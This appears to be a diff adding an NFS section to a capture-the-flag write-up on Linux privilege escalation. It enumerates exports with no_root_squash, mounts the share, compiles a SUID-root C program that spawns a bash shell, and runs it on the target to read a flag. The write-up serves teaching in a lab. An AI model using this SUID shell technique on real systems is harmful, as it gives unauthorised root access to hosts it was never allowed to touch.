@@ -304,3 +304,92 @@ THM-X
 ```
 
 Because test runs with root privileges and relies on a relative command name, we successfully hijacked execution flow and gained a root shell.
+
+# Privilege Escalation: NFS
+
+NFS (Network File System) is a distributed file system protocol that allows a computer to access files over a network as if they were stored locally.
+
+You can check NFS configuration on the target system like this:
+
+```
+$ cat /etc/exports
+# /etc/exports: the access control list for filesystems which may be exported
+#		to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
+```
+
+You can also enumerate exported shares remotely:
+
+```
+[ Oguri ~/Desktop ]$ showmount -e 10.65.164.237 
+Export list for 10.65.164.237:
+/home/ubuntu/sharedfolder *
+/tmp                      *
+/home/backup              *
+```
+
+The critical element for this privilege escalation vector is the no_root_squash option.
+
+By default, NFS maps the remote root user to nfsnobody (this is called root squashing) and strips root privileges.
+If no_root_squash is enabled on a writable share, the remote root user keeps root privileges on the mounted filesystem.
+
+This means we can:
+- Mount the share locally
+- Create a binary with the SUID bit set
+- Execute it on the target system to gain root access
+
+Mounting the Remote Share
+
+```
+$ sudo mount -o rw 10.65.164.237:/tmp /tmp/ctftmp
+```
+
+After mounting, we create a malicious file:
+
+```
+[ Oguri /tmp/ctftmp ]$ cat exploit.c
+#include <unistd.h>
+#include <stdlib.h>
+
+int main() {
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+    return 0;
+}
+```
+
+Compile it statically and set the SUID bit:
+
+```
+[ Oguri /tmp/ctftmp ]$ sudo gcc -static exploit.c -o exploit -w
+[ Oguri /tmp/ctftmp ]$ sudo chmod +s exploit
+```
+
+Because the share has no_root_squash, the SUID root permission is preserved on the target system.
+Now on the target:
+
+```
+$ cd /tmp
+$ ls
+exploit
+exploit.c
+...
+
+$ ./exploit
+root@ip-10-65-164-237:/tmp# find / -name flag7.txt
+/home/matt/flag7.txt
+
+root@ip-10-65-164-237:/tmp# cat /home/matt/flag7.txt
+THM-X
+```
